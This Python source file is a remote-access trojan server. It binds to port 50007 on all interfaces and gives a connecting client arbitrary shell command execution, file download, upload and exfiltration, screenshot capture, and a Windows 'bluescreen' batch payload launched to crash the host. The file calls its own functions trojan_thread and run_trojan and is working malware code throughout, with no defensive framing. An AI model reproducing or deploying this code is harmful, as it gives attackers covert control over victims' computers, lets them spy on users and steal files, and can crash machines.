# PARAM server program
import os
import urllib
import urllib.parse
import urllib.request
import socket
import shlex
import platform
import subprocess
from tools import *
import param
import shell
import mythread
import tmp
import screenshot
import bs

HOST = ''                 # Symbolic name meaning all available interfaces
PORT = 50007              # Arbitrary non-privileged port

def cmd_chdir(*args, **kwargs):
    if len(args) >= 2:
        os.chdir(args[1])
    return None


def cmd_fetch(*args, **kwargs):
    result = {}
    if len(args) >= 2:
        url = args[1]
        if len(args) >= 3:
            target = os.path.abspath(args[2])
            if isinstance(target, list):
                target = os.path.join(*target)
        else:
            target = os.getcwd()
        urlInfo  = urllib.parse.urlparse(url)
        if not urlInfo.path:
            fileName = 'index.html'
        else:
            fileName = os.path.basename(urlInfo.path)
            if not fileName:
                fileName = 'noname.html'
        if os.path.exists(target):
            if os.path.isdir(target):
                dirName  = target
                fullName = os.path.join(dirName, fileName)
            else:
                return {'stderr': '%s exists' % target}
        else:
            fullName = target
        targetPath = os.path.dirname(fullName)
        if targetPath and not os.path.exists(targetPath):
            os.makedirs(targetPath)
        with open(fullName, 'wb') as outputfp:
            with urllib.request.urlopen(args[1]) as inputfp:
                while True:
                    data = inputfp.read(16384)
                    if not data:
                        break
                    outputfp.write(data)
        result['stdout']   = 'save to %s' % fullName
        result['fileName'] = fullName
        result['pathList'] = shell.path_split(fullName)
    return result

def cmd_saveFile(*args, **kwargs):
    result     = {}
    fileInfo   = kwargs.get('fileInfo')
    fileName   = kwargs.get('fileName')
    fullName   = shell.save_fileInfo(fileInfo, fileName)
    if fullName:
        result['stdout']   = 'save to %s' % fullName
        result['fileName'] = fullName
        result['pathList'] = shell.path_split(fullName)
    return result

def cmd_sendFile(*args, **kwargs):
    fileName   = kwargs.get('fileName')
    pathList   = kwargs.get('pathList')
    result     = shell.get_fileInfo(fileName)
    return result

def cmd_screenshot(*args, **kwargs):
    result   = {}
    tempobj  = tmp.TMP()
    tempName = tempobj.get_tempname('screenshot_', '.png', 'SCREENSHOT')
    dirName  = os.path.dirname(tempName)
    if dirName and not os.path.exists(dirName):
        os.makedirs(dirName)
    tempName = screenshot.screenshot_grab(tempName)
    if not tempName:
        result['stderr'] = 'grab screenshot fails'
    result     = shell.get_fileInfo(tempName)
    result['pathList']   = shell.path_split(tempName)
    return result

def cmd_bluescreen(*args, **kwargs):
    result     = {}
    tempobj    = tmp.TMP()
    if platform.system() == 'Windows':
        tempName   = tempobj.get_tempname('bluescreen', '.bat', 'EXECUTE')
        dirname    = os.path.dirname(tempName)
        if dirname and not os.path.exists(dirname):
            os.makedirs(dirname)
        with open(tempName, 'w') as fp:
            fp.write(bs.batfile)
        proc   = subprocess.Popen(tempName, shell=True)
        result = {'stderr': 'execute %s' % tempName}
    else:
        result = {'stderr': '%s is not supported' % platform.system()}
    return result


cmd_map = {
        'cd':           cmd_chdir,
        'chdir':        cmd_chdir,
        'fetch':        cmd_fetch,
        'save':         cmd_saveFile,
        'send':         cmd_sendFile,
        'screenshot':   cmd_screenshot,
        'bluescreen':   cmd_bluescreen,
        }

def trojan_thread(conn, addr):
    with conn:
        print('Connected by', addr)
        handle = param.PARAM(server=conn)
        while True:
            retval = {}
            try:
                data = handle.read()
                if not data: break
                print('receive from %s' % (str(addr)))
                print('receive command:', data)
                #
                if isinstance(data, str):
                    argv    = shlex.split(data)
                    if len(argv) < 1:
                        continue
                    command = argv[0]
                    if command in ['quit', 'exit']:
                        break
                    func    = cmd_map.get(command)
                    retval  = func(*argv) if func else shell.exec_shell_command(data)
                elif isinstance(data, dict):
                    command = data.get('command')
                    if command:
                        func   = cmd_map.get(command)
                        if func:
                            retval = func(**data)
                #
                print('retval:', retval)
                if not retval:
                    retval = {}
                if isinstance(retval, dict):
                    retval['cwd'] = os.getcwd()
                print('send back to %s' % (str(addr)))
                handle.write(retval)
                continue
            except Exception as e:
                errs = str(e)
            print('Exception:', str(errs))
            retval   = {'exception': errs, 'stderr': errs}
            handle.write(retval)

def run_trojan(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port,))
        s.listen(1)
        while True:
            conn, addr = s.accept()
            p = mythread.myThread(target = trojan_thread, args=(conn, addr,))
            p.start()

if __name__ == '__main__':
    retval = run_trojan(HOST, PORT)
    # retval = cmd_fetch('fetch', 'http://www.google.com', 'abc.html')
    # retval = cmd_saveFile(fileName='/tmp/abc.txt', fileInfo={'fileName':'/tmp/abc', 'fileContent':'abcdefg'})
    # retval = cmd_screenshot()
    print(retval)
